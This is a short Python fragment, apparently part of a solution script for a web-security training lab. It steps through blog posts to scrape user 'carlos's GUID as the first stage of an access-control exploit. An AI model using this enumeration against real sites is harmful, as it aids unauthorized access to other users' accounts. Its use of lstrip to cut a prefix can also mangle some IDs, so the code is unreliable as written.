...
#####################
def get_guid(url,s):
    print("[+] Trying to get carlos' GUID")
    post_url = url+"/post"
    page = 1
    while True:
        params = {'postId':page}
        r = s.get(post_url, params=params, verify=False, proxies=proxies)
        author_name = ''.join(bs(r.text,"html.parser").find("span",{'id':'blog-author'}).find("a"))
        if author_name:
            if author_name == 'carlos':
                user_guid = bs(r.text,"html.parser").find("span",{'id':'blog-author'}).find("a")['href'].lstrip('/blogs?userId=')
                print(f"[+] Successfuly retrieved the carlos' GUID\n\tCarlos' GUID: {user_guid}")
                return user_guid
            else:
                page+=1
        else:
            print("[-] Couldn't retrieve the GUID")
